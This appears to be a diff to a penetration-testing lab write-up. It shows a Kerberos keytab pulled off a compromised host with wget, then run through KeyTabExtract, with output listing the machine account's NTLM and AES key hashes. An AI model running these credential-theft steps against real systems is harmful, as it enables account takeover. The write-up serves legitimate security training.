@@ -941,21 +941,17 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 Ill start this on the target
 
 ```python
-wget http://nix01.casper.hsm/krb5.keytab                                               
---2026-08-05 19:31:37--  http://nix01.casper.hsm/krb5.keytab
+wget http://nix01.casper.hsm:8000/krb5.keytab         
+--2026-08-05 19:34:08--  http://nix01.casper.hsm:8000/krb5.keytab
 Resolving nix01.casper.hsm (nix01.casper.hsm)... 10.0.20.54
-Connecting to nix01.casper.hsm (nix01.casper.hsm)|10.0.20.54|:80... connected.
-HTTP request sent, awaiting response... 302 Found
-Location: http://nix01.casper.hsm/users/sign_in [following]
---2026-08-05 19:31:37--  http://nix01.casper.hsm/users/sign_in
-Reusing existing connection to nix01.casper.hsm:80.
+Connecting to nix01.casper.hsm (nix01.casper.hsm)|10.0.20.54|:8000... connected.
 HTTP request sent, awaiting response... 200 OK
-Length: 10384 (10K) [text/html]
+Length: 1171 (1.1K) [application/octet-stream]
 Saving to: ‘krb5.keytab’
 
-krb5.keytab                                        100%[==============================================================================================================>]  10.14K  --.-KB/s    in 0s      
+krb5.keytab                                        100%[==============================================================================================================>]   1.14K  --.-KB/s    in 0.001s  
 
-2026-08-05 19:31:38 (1.18 GB/s) - ‘krb5.keytab’ saved [10384/10384]
+2026-08-05 19:34:08 (2.13 MB/s) - ‘krb5.keytab’ saved [1171/1171]
 ```
 
 Then just wget it to my machine!
@@ -964,5 +960,17 @@ Then ill clone the repo on my machine
 
 ```python
 git clone https://github.com/sosdave/KeyTabExtract.git
-
+cd KeyTabExtract.git
+python3 keytabextract.py ../krb5.keytab
+[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
+[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
+[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
+[+] Keytab File successfully imported.
+	REALM : CASPER.HSM
+	SERVICE PRINCIPAL : NIX01$/
+	NTLM HASH : 0cf15e4eee91372abddec89ec40e636e
+	AES-256 HASH : 0791b813fd10e4506796b8cd214ea0ca8f3ef019f30cdf626cdab38b4e7eace2
+	AES-128 HASH : 52018b232858e98374e4344d1db0111c
 ```
+
+
